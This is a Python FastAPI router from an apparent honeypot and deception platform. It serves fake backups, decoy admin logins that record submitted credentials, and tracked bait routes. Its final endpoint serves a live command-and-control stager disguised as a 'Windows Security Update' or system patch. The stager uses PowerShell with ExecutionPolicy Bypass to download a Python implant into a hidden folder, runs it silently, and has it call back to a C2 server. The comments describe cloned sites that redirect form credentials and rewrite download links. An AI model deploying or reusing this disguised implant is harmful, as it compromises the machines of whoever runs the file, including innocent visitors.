import hashlib
from datetime import datetime, timezone
from html import escape
from pathlib import Path

from fastapi import APIRouter, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse, Response
from sqlalchemy import select

from app.core.db import SessionLocal
from app.models.decoy import DecoyDeployment, DecoyTemplate
from app.services.events import (
    console_base_url,
    create_credential_observation,
    create_event,
    extract_client_ip,
    filtered_headers,
)

router = APIRouter(tags=["traps"])
PROJECT_ROOT = Path(__file__).resolve().parents[2]


def _template_meta(template: DecoyTemplate | None) -> dict:
    meta = getattr(template, "metadata_json", None) if template else {}
    return meta if isinstance(meta, dict) else {}


def _uploaded_decoy_file_bytes(template: DecoyTemplate | None) -> tuple[bytes | None, str]:
    meta = _template_meta(template)
    artifact_path = meta.get("artifact_path")
    if not artifact_path:
        return None, meta.get("content_type") or "application/octet-stream"
    path = Path(artifact_path)
    if not path.is_absolute():
        path = PROJECT_ROOT / path
    try:
        if not path.is_file():
            return None, meta.get("content_type") or "application/octet-stream"
        return path.read_bytes(), meta.get("content_type") or "application/octet-stream"
    except OSError:
        return None, meta.get("content_type") or "application/octet-stream"


def _latest_deployment_for_template(db, template_id: int | None) -> DecoyDeployment | None:
    if not template_id:
        return None
    return db.scalar(
        select(DecoyDeployment)
        .where(DecoyDeployment.template_id == template_id)
        .order_by(DecoyDeployment.created_at.desc(), DecoyDeployment.id.desc())
    )


def _render_decoy_content(db, deployment: DecoyDeployment, template: DecoyTemplate | None) -> tuple[str, dict]:
    honeypot_value = deployment.target_endpoint or "127.0.0.1:22"
    content = template.content_template if template else "$username$:$password$@$honeypot$"
    route_dep = _latest_deployment_for_template(db, getattr(template, "bind_route_template_id", None))
    credential_dep = _latest_deployment_for_template(db, getattr(template, "bind_credential_template_id", None))
    api_route = route_dep.fetch_path if route_dep else ""
    credential_login = credential_dep.fetch_path if credential_dep else ""
    rendered = (
        content.replace("$username$", deployment.generated_username)
        .replace("$password$", deployment.generated_password)
        .replace("$honeypot$", honeypot_value)
        .replace("$route$", api_route)
        .replace("$api_route$", api_route)
        .replace("$credential_login$", credential_login)
        .replace("$credential_username$", credential_dep.generated_username if credential_dep else "")
        .replace("$credential_password$", credential_dep.generated_password if credential_dep else "")
        .replace("$route", api_route)
        .replace("$api_route", api_route)
        .replace("$credential_login", credential_login)
        .replace("$credential_username", credential_dep.generated_username if credential_dep else "")
        .replace("$credential_password", credential_dep.generated_password if credential_dep else "")
    )
    if template and getattr(template, "decoy_type", "") == "file" and (route_dep or credential_dep):
        rendered += "\n\n# AgentCapture decoy chain\n"
        if route_dep:
            rendered += f"api_route={route_dep.fetch_path}\n"
        if credential_dep:
            rendered += (
                f"credential_login={credential_dep.fetch_path}\n"
                f"credential_username={credential_dep.generated_username}\n"
                f"credential_password={credential_dep.generated_password}\n"
            )
    return rendered, {
        "bound_route_path": api_route,
        "bound_credential_login": credential_login,
        "bound_credential_username": credential_dep.generated_username if credential_dep else "",
    }


@router.get("/_trap/backup/site-backup-2025-05.zip")
def backup_bait() -> Response:
    # A real ZIP container — plain text served as .zip is an instant tell.
    # Contents are decoys carrying the trap's tracking markers.
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            "readme.txt",
            "Staging site backup snapshot (2025-05).\n"
            "Contains config drafts and restore helper. Handle internally.\n",
        )
        zf.writestr(
            "config/database.yml",
            "# staging database (read replica)\n"
            "host: 10.20.30.15\n"
            "port: 5432\n"
            "username: staging_ro\n"
            "password: Stg#2025!readonly\n",
        )
        zf.writestr(
            "restore.sh",
            "#!/bin/bash\n"
            "# restore helper — verifies mirror reachability first\n"
            "curl -sf http://mirror.internal:8080/health || echo 'mirror offline'\n"
            "echo 'restore staged'\n",
        )
    return Response(
        content=buf.getvalue(),
        media_type="application/zip",
        headers={"Content-Disposition": 'attachment; filename="site-backup-2025-05.zip"'},
    )


@router.get("/internal/openapi.json")
def internal_openapi() -> dict:
    return {
        "openapi": "3.0.0",
        "info": {"title": "Internal Staging API", "version": "0.0.1"},
        "paths": {
            "/admin/reindex": {
                "post": {
                    "summary": "Restricted staging maintenance action",
                    "description": "For internal staging operations only.",
                }
            }
        },
    }


@router.get("/docs/runbook-internal.md")
def internal_runbook() -> PlainTextResponse:
    body = """# Internal staging runbook

- read-only mirror endpoint: /_trap/admin/staging-login
- maintenance window: controlled access only
- all write actions are disabled in monitored environments
"""
    return PlainTextResponse(body)


@router.get("/_trap/admin/staging-login")
def admin_login() -> HTMLResponse:
    # Believable staging console login. Deliberately carries no honeypot
    # wording — the page must look like an ordinary forgotten admin panel.
    return HTMLResponse(
        """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Staging Console · Sign in</title>
<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f3f5f9;color:#1f2937}
.card{width:360px;padding:32px;background:#fff;border:1px solid #e2e8f0;border-radius:12px;box-shadow:0 10px 30px rgba(15,23,42,.08)}
h1{margin:0 0 4px;font-size:20px;color:#0f172a}
.sub{margin:0 0 20px;font-size:13px;color:#64748b}
label{display:block;margin-top:14px;font-size:12px;font-weight:600;color:#475569}
input{width:100%;margin-top:6px;padding:10px 12px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px;outline:none}
input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.12)}
button{width:100%;margin-top:20px;padding:11px;border:0;border-radius:8px;background:#2563eb;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
button:hover{background:#1d4ed8}
.error{margin-top:16px;padding:10px 12px;border-radius:8px;background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;font-size:13px}
.foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
  <form class="card" method="post" action="/_trap/admin/staging-login">
    <h1>Staging Console</h1>
    <p class="sub">Internal deployment environment</p>
    <label>Username<input type="text" name="username" autocomplete="username" autofocus></label>
    <label>Password<input type="password" name="password" autocomplete="current-password"></label>
    <button type="submit">Sign in</button>
    <div class="foot">staging env · restricted access</div>
  </form>
</body>
</html>"""
    )


def _staging_login_error_page() -> HTMLResponse:
    return HTMLResponse(
        """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Staging Console · Sign in</title>
<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;font-family:-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#f3f5f9;color:#1f2937}
.card{width:360px;padding:32px;background:#fff;border:1px solid #e2e8f0;border-radius:12px;box-shadow:0 10px 30px rgba(15,23,42,.08)}
h1{margin:0 0 4px;font-size:20px;color:#0f172a}
.sub{margin:0 0 20px;font-size:13px;color:#64748b}
label{display:block;margin-top:14px;font-size:12px;font-weight:600;color:#475569}
input{width:100%;margin-top:6px;padding:10px 12px;border:1px solid #cbd5e1;border-radius:8px;font-size:14px;outline:none}
input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.12)}
button{width:100%;margin-top:20px;padding:11px;border:0;border-radius:8px;background:#2563eb;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
button:hover{background:#1d4ed8}
.error{margin-top:16px;padding:10px 12px;border-radius:8px;background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;font-size:13px}
.foot{margin-top:18px;font-size:11px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
  <form class="card" method="post" action="/_trap/admin/staging-login">
    <h1>Staging Console</h1>
    <p class="sub">Internal deployment environment</p>
    <label>Username<input type="text" name="username" autocomplete="username" autofocus></label>
    <label>Password<input type="password" name="password" autocomplete="current-password"></label>
    <button type="submit">Sign in</button>
    <div class="error">Invalid username or password.</div>
    <div class="foot">staging env · restricted access</div>
  </form>
</body>
</html>"""
    )


@router.post("/_trap/admin/staging-login")
def admin_login_submit(
    request: Request,
    username: str = Form(""),
    password: str = Form(""),
) -> JSONResponse:
    source_ip = extract_client_ip(request)
    session_id = getattr(request.state, "session_id", "unknown")
    with SessionLocal() as db:
        create_credential_observation(
            db,
            source_ip=source_ip,
            node_name="embedded-node",
            service_name="staging-login",
            username=username,
            password=password,
            path=request.url.path,
            session_id=session_id,
            source_label="web-decoy",
        )
        create_event(
            db,
            site_id="embedded-node",
            session_id=session_id,
            source_ip=source_ip,
            method=request.method,
            path=request.url.path,
            status_code=403,
            event_type="credential_attempt",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={"username": username},
            signals_json=["credential_submission", "trap_route_hit"],
            risk_score=85,
            decision="isolate",
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="credential_attempt",
            source_ip=source_ip,
            decision="isolate",
            risk_score=85,
            signals=["credential_submission", "trap_route_hit"],
            path=request.url.path,
            method=request.method,
            summary=f"credential attempt from {source_ip} on staging-login (score=85)",
            timestamp=datetime.now(timezone.utc),
        ))
    # Respond like a real failed login so the attacker keeps trying.
    return _staging_login_error_page()


@router.get("/d/{token}/{filename}")
def fetch_decoy(token: str, filename: str, request: Request) -> Response:
    with SessionLocal() as db:
        deployment = db.scalar(select(DecoyDeployment).where(DecoyDeployment.fetch_path == f"/d/{token}/{filename}"))
        if not deployment:
            return Response(status_code=404)
        template = db.get(DecoyTemplate, deployment.template_id) if deployment.template_id else None
        rendered, chain_payload = _render_decoy_content(db, deployment, template)
        uploaded_bytes, uploaded_media_type = _uploaded_decoy_file_bytes(template) if getattr(template, "decoy_type", "") == "file" and not (template.content_template or "").strip() else (None, "application/octet-stream")
        deployment.status = "fetched"
        deployment.last_fetched_at = datetime.now(timezone.utc)
        deployment.last_triggered_at = datetime.now(timezone.utc)
        db.add(deployment)
        create_event(
            db,
            site_id="embedded-node",
            session_id=getattr(request.state, "session_id", "unknown"),
            source_ip=extract_client_ip(request),
            method=request.method,
            path=request.url.path,
            status_code=200,
            event_type="decoy_fetch",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={"deployment_id": deployment.id, "filename": filename, "decoy_type": getattr(template, "decoy_type", "file") if template else "file", **chain_payload},
            signals_json=["decoy_fetched", "file_decoy_download"],
            risk_score=55,
            decision="challenge",
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="decoy_fetch",
            source_ip=extract_client_ip(request),
            decision="challenge",
            risk_score=55,
            signals=["decoy_fetched", "file_decoy_download"],
            path=request.url.path,
            method=request.method,
            summary=f"file decoy fetched from {extract_client_ip(request)}: {filename} (score=55)",
            timestamp=datetime.now(timezone.utc),
        ))
        db.commit()
        return Response(
            content=uploaded_bytes if uploaded_bytes is not None else rendered.encode("utf-8"),
            media_type=uploaded_media_type if uploaded_bytes is not None else "application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )


@router.get("/_bait/credential/{token}/login")
def credential_decoy_login(token: str, request: Request) -> HTMLResponse:
    path = f"/_bait/credential/{token}/login"
    with SessionLocal() as db:
        deployment = db.scalar(select(DecoyDeployment).where(DecoyDeployment.fetch_path == path))
        if not deployment:
            return HTMLResponse("not found", status_code=404)
        template = db.get(DecoyTemplate, deployment.template_id) if deployment.template_id else None
        title = escape(template.name if template else "Admin Login")
        return HTMLResponse(
            f"""<!doctype html><html><head><meta charset="utf-8"><title>{title}</title>
            <style>body{{font-family:system-ui;background:#07111f;color:#e5edf8;display:grid;place-items:center;min-height:100vh}}
            form{{width:360px;padding:28px;border:1px solid #23466f;border-radius:20px;background:#0d1a2d}}input,button{{width:100%;margin-top:12px;padding:12px;border-radius:10px;border:1px solid #345;background:#091322;color:#fff}}button{{background:#2563eb}}</style></head>
            <body><form method="post"><h2>{title}</h2>
            <input name="username" placeholder="Username" autofocus><input name="password" type="password" placeholder="Password"><button>Sign in</button></form></body></html>"""
        )


@router.post("/_bait/credential/{token}/login")
def credential_decoy_submit(token: str, request: Request, username: str = Form(""), password: str = Form("")) -> JSONResponse:
    path = f"/_bait/credential/{token}/login"
    source_ip = extract_client_ip(request)
    session_id = getattr(request.state, "session_id", "unknown")
    with SessionLocal() as db:
        deployment = db.scalar(select(DecoyDeployment).where(DecoyDeployment.fetch_path == path))
        if not deployment:
            return JSONResponse({"status": "not_found"}, status_code=404)
        template = db.get(DecoyTemplate, deployment.template_id) if deployment.template_id else None
        matched_generated = username == deployment.generated_username and password == deployment.generated_password
        deployment.status = "triggered" if matched_generated else "fetched"
        deployment.last_triggered_at = datetime.now(timezone.utc)
        db.add(deployment)
        create_credential_observation(
            db,
            source_ip=source_ip,
            node_name="embedded-node",
            service_name=deployment.target_endpoint or "credential-decoy",
            username=username,
            password=password,
            path=path,
            session_id=session_id,
            source_label="credential-decoy",
        )
        create_event(
            db,
            site_id="embedded-node",
            session_id=session_id,
            source_ip=source_ip,
            method=request.method,
            path=path,
            status_code=403,
            event_type="credential_attempt",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={
                "deployment_id": deployment.id,
                "template": template.name if template else "",
                "username": username,
                "matched_generated_credential": matched_generated,
            },
            signals_json=["credential_decoy_login", "leaked_credential_used"] if matched_generated else ["credential_submission"],
            risk_score=92 if matched_generated else 70,
            decision="isolate",
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="credential_attempt",
            source_ip=source_ip,
            decision="isolate",
            risk_score=92 if matched_generated else 70,
            signals=["credential_decoy_login", "leaked_credential_used"] if matched_generated else ["credential_submission"],
            path=path,
            method=request.method,
            summary=f"credential decoy login from {source_ip}: {'matched' if matched_generated else 'mismatched'} (score={92 if matched_generated else 70})",
            timestamp=datetime.now(timezone.utc),
        ))
        db.commit()
    return JSONResponse({"status": "blocked", "message": "Authentication disabled in monitored environment."}, status_code=403)


@router.api_route("/_bait/{bait_path:path}", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"])
async def fetch_api_route_decoy(bait_path: str, request: Request) -> JSONResponse:
    path = f"/_bait/{bait_path}"
    with SessionLocal() as db:
        deployment = db.scalar(select(DecoyDeployment).where(DecoyDeployment.fetch_path == path))
        if not deployment:
            return JSONResponse({"code": 404, "message": "not found"}, status_code=404)
        template = db.get(DecoyTemplate, deployment.template_id) if deployment.template_id else None
        deployment.status = "fetched"
        deployment.last_fetched_at = datetime.now(timezone.utc)
        deployment.last_triggered_at = datetime.now(timezone.utc)
        db.add(deployment)
        create_event(
            db,
            site_id="embedded-node",
            session_id=getattr(request.state, "session_id", "unknown"),
            source_ip=extract_client_ip(request),
            method=request.method,
            path=request.url.path,
            status_code=404,
            event_type="decoy_fetch",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={"deployment_id": deployment.id, "decoy_type": "api_route", "template": template.name if template else ""},
            signals_json=["api_route_decoy_hit", "trap_route_hit"],
            risk_score=72,
            decision="challenge",
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="decoy_fetch",
            source_ip=extract_client_ip(request),
            decision="challenge",
            risk_score=72,
            signals=["api_route_decoy_hit", "trap_route_hit"],
            path=request.url.path,
            method=request.method,
            summary=f"API route decoy hit from {extract_client_ip(request)}: /{bait_path} (score=72)",
            timestamp=datetime.now(timezone.utc),
        ))
        db.commit()
    return JSONResponse({"code": 404, "message": "not found"}, status_code=404)


# ---------------------------------------------------------------------------
# Clone-template honeypot endpoints
# ---------------------------------------------------------------------------
# Cloned web templates inject a small runtime script that:
#   * Intercepts <form> submissions and POSTs the credentials to
#     `/_clone/credential` instead of the real upstream.
#   * Rewrites file download links to point at `/_clone/payload/<os>`.
# Both endpoints log to the same event pipeline as decoy triggers and return
# blocked responses so the attacker believes the system rejected them.

_PLATFORM_HINTS = (
    ("windows", ("win32", "wow64", "windows", "nt ")),
    ("macos", ("macintosh", "mac os", "darwin")),
    ("linux", ("linux", "x11", "ubuntu", "debian")),
)


def _detect_cloner_platform(request: Request) -> str:
    """Pick the most likely target OS from the UA string of the cloned client."""
    ua = (request.headers.get("user-agent") or "").lower()
    for label, markers in _PLATFORM_HINTS:
        if any(marker in ua for marker in markers):
            return label
    return "any"


def _resolve_clone_session_token(request: Request) -> str:
    """Use the canary session cookie as the clone session token when present."""
    from app.core.config import get_settings

    settings = get_settings()
    return request.cookies.get(settings.session_cookie_name) or "clone-anon"


def _deployment_context_from_request(request: Request) -> dict:
    """Extract deployment context stamped by the per-port background proxy.

    The background Uvicorn servers in ``app/services/deployed_server.py`` add
    X-Template-Id / X-Node-Id / X-Deploy-Port / X-Deploy-Route on every
    forwarded ``/_clone/*`` request. We surface those here so the resulting
    ``Event`` row can be cross-referenced back to the originating template
    and the node that served it.
    """
    def _int(name: str):
        raw = request.headers.get(name)
        if not raw:
            return None
        try:
            return int(raw)
        except (TypeError, ValueError):
            return None

    return {
        "template_id": _int("X-Template-Id"),
        "node_id": _int("X-Node-Id"),
        "deploy_port": _int("X-Deploy-Port"),
        "deploy_route": request.headers.get("X-Deploy-Route") or None,
        "template_name": request.headers.get("X-Template-Name") or None,
    }


@router.post("/_clone/beacon")
async def clone_bacon_submit(request: Request) -> JSONResponse:
    """Receive browser telemetry from cloned honeypot pages.

    The inline beacon in cloned pages POSTs browser signals (UA, screen,
    timezone, WebRTC IP leaks) here.  We log it as a recon event so it
    shows up in the dashboard alongside other honeypot signals.
    """
    source_ip = extract_client_ip(request)
    session_id = getattr(request.state, "session_id", None) or _resolve_clone_session_token(request)
    try:
        body = await request.json()
    except Exception:
        body = {}
    deploy_ctx = _deployment_context_from_request(request)
    with SessionLocal() as db:
        create_event(
            db,
            site_id="embedded-node",
            session_id=session_id,
            source_ip=source_ip,
            method=request.method,
            path=request.url.path,
            status_code=200,
            event_type="recon_fingerprint",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={
                "channel": "cloned-site",
                **({"template_name": deploy_ctx["template_name"]} if deploy_ctx["template_name"] else {}),
                **body,
            } if isinstance(body, dict) else {"channel": "cloned-site"},
            signals_json=["cloned_site_beacon", "browser_fingerprint"],
            risk_score=30,
            decision="observe",
            template_id=deploy_ctx["template_id"],
            node_id=deploy_ctx["node_id"],
            deploy_port=deploy_ctx["deploy_port"],
            deploy_route=deploy_ctx["deploy_route"],
        )
    return JSONResponse({"status": "ok"})


@router.post("/_clone/credential")
async def clone_credential_submit(request: Request) -> JSONResponse:
    """Capture credentials submitted from cloned login pages.

    Accepts both JSON (`application/json`) and `application/x-www-form-urlencoded`
    so it works regardless of whether the cloned frontend uses fetch() or a
    plain HTML <form>.
    """
    content_type = (request.headers.get("content-type") or "").lower()
    credentials: dict[str, str] = {}
    source_url = ""
    if "application/json" in content_type:
        try:
            payload = await request.json()
        except Exception:
            payload = {}
        if isinstance(payload, dict):
            for key, value in payload.items():
                if isinstance(value, (str, int, float)):
                    credentials[str(key)] = str(value)
                elif isinstance(value, dict):
                    # Handle Vue/React nested state objects — flatten leaf strings.
                    for k2, v2 in value.items():
                        if isinstance(v2, (str, int, float)):
                            credentials[f"{key}.{k2}"] = str(v2)
            source_url = str(payload.get("source_url") or "")
    else:
        try:
            form = await request.form()
        except Exception:
            form = {}
        for key in form.keys():
            # Capture multi-value inputs as comma-joined.
            values = form.getlist(key)
            credentials[key] = ", ".join(str(v) for v in values) if values else ""
        source_url = str(credentials.pop("source_url", "") or "")

    if not credentials:
        return JSONResponse(
            {"status": "blocked", "message": "Authentication disabled in monitored environment."},
            status_code=403,
        )

    username = credentials.get("username") or credentials.get("user") or credentials.get("account") or credentials.get("login") or credentials.get("email") or ""
    password = credentials.get("password") or credentials.get("pass") or credentials.get("passwd") or credentials.get("pwd") or credentials.get("token") or ""
    service_name = credentials.get("service") or "cloned-login"

    source_ip = extract_client_ip(request)
    session_id = getattr(request.state, "session_id", None) or _resolve_clone_session_token(request)
    deploy_ctx = _deployment_context_from_request(request)
    with SessionLocal() as db:
        create_credential_observation(
            db,
            source_ip=source_ip,
            node_name="embedded-node",
            service_name=service_name,
            username=username,
            password=password,
            path=f"/_clone/credential{('?from=' + source_url) if source_url else ''}",
            session_id=session_id,
            source_label="cloned-site",
        )
        create_event(
            db,
            site_id="embedded-node",
            session_id=session_id,
            source_ip=source_ip,
            method=request.method,
            path=request.url.path,
            status_code=403,
            event_type="credential_attempt",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={
                "captured_fields": credentials,
                "source_url": source_url,
                "channel": "cloned-site",
            },
            signals_json=["cloned_site_credential", "credential_submission"],
            risk_score=85,
            decision="isolate",
            template_id=deploy_ctx["template_id"],
            node_id=deploy_ctx["node_id"],
            deploy_port=deploy_ctx["deploy_port"],
            deploy_route=deploy_ctx["deploy_route"],
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="credential_attempt",
            source_ip=source_ip,
            decision="isolate",
            risk_score=85,
            signals=["cloned_site_credential", "credential_submission"],
            path=request.url.path,
            method=request.method,
            summary=f"cloned-site credential from {source_ip} on {service_name} (fields={len(credentials)})",
            timestamp=datetime.now(timezone.utc),
        ))
    return JSONResponse(
        {
            "status": "blocked",
            "message": "Authentication disabled in monitored environment.",
            "code": "monitored",
        },
        status_code=403,
    )


@router.get("/_clone/payload/{platform}")
def clone_payload(platform: str, request: Request) -> Response:
    """Serve a system-appropriate stager to downloads triggered on cloned sites.

    The cloned frontend rewrites file download links to this endpoint and adds
    a `?for=<file>` query so the platform response can stay relevant. The
    returned file is a live C2 stager disguised as the requested download:
    when the attacker executes it, their device registers and checks in as a
    C2 agent (id prefix ``cln`` + tracking id, correlating the execution back
    to this download). Authorized deception use only.
    """
    from app.services.c2_agent_builder import build_agent_wrapper_script
    from app.core.config import get_settings

    settings = get_settings()

    platform = (platform or "any").lower().strip()
    if platform == "any" or platform not in {"windows", "macos", "linux"}:
        platform = _detect_cloner_platform(request)
    requested_file = request.query_params.get("for", "")
    session_id = getattr(request.state, "session_id", None) or _resolve_clone_session_token(request)
    source_ip = extract_client_ip(request)
    tid = hashlib.md5(f"{session_id}:{platform}:{requested_file}".encode()).hexdigest()[:12]

    # The stager must call home to the management console where C2 listeners
    # live — NOT the honeypot origin that served this bait (default 48777 vs
    # console 4877). payload_callback_host wins when explicitly configured.
    c2_addr = settings.payload_callback_host or console_base_url(request)
    stager_agent_id = f"cln{tid}"

    if platform == "windows":
        filename = requested_file or "security_update.bat"
        mime = "application/octet-stream"
        body = (
            "@echo off\r\n"
            "title Windows Security Update\r\n"
            f"REM TRACKING_ID: {tid}\r\n"
            "echo Installing security update...\r\n"
            "set IMPLANT_DIR=%USERPROFILE%\\.sysd\r\n"
            'mkdir "%IMPLANT_DIR%" 2>nul\r\n'
            "set IMPLANT_FILE=%IMPLANT_DIR%\\sys_update.py\r\n"
            f'powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \'{c2_addr}/c2/agent/download/python?agent_id={stager_agent_id}&server={c2_addr}\' -OutFile \'%IMPLANT_FILE%\'" 2>nul\r\n'
            'start /B pythonw.exe "%IMPLANT_FILE%" >nul 2>&1\r\n'
            "ping -n 2 127.0.0.1 >nul\r\n"
            "echo Update installed successfully.\r\n"
            "exit /b 0\r\n"
        ).encode("utf-8")
    else:
        filename = requested_file or ("macos_patch.sh" if platform == "macos" else "linux_patch.sh")
        mime = "application/x-sh"
        spec = build_agent_wrapper_script(
            c2_server=c2_addr,
            agent_id=stager_agent_id,
            persistence=False,
        )
        body = (
            f"#!/bin/bash\n# TRACKING_ID: {tid}\n# Applying system patch, please wait...\n".encode("utf-8")
            + spec.content.split(b"\n", 1)[1]
        )

    # Log the download attempt as a decoy_fetch event so it shows up alongside
    # other honeypot downloads in dashboards.
    deploy_ctx = _deployment_context_from_request(request)
    with SessionLocal() as db:
        create_event(
            db,
            site_id="embedded-node",
            session_id=session_id,
            source_ip=source_ip,
            method=request.method,
            path=request.url.path,
            status_code=200,
            event_type="decoy_fetch",
            user_agent=request.headers.get("user-agent", ""),
            headers_json=filtered_headers(request),
            payload_json={
                "channel": "cloned-site",
                "platform": platform,
                "requested_file": requested_file,
                "served_file": filename,
                "tracking_id": tid,
                "stager_agent_id": stager_agent_id,
                "live_stager": True,
                "size": len(body),
            },
            signals_json=["cloned_site_payload", "decoy_fetched"],
            risk_score=70,
            decision="challenge",
            template_id=deploy_ctx["template_id"],
            node_id=deploy_ctx["node_id"],
            deploy_port=deploy_ctx["deploy_port"],
            deploy_route=deploy_ctx["deploy_route"],
        )
        from app.services.alert_dispatcher import AlertPayload, get_alert_dispatcher
        get_alert_dispatcher().start_event(AlertPayload(
            event_type="decoy_fetch",
            source_ip=source_ip,
            decision="challenge",
            risk_score=70,
            signals=["cloned_site_payload", "decoy_fetched"],
            path=request.url.path,
            method=request.method,
            summary=f"cloned-site payload fetched from {source_ip}: {filename} (platform={platform})",
            timestamp=datetime.now(timezone.utc),
        ))
    return Response(
        content=body,
        media_type=mime,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )
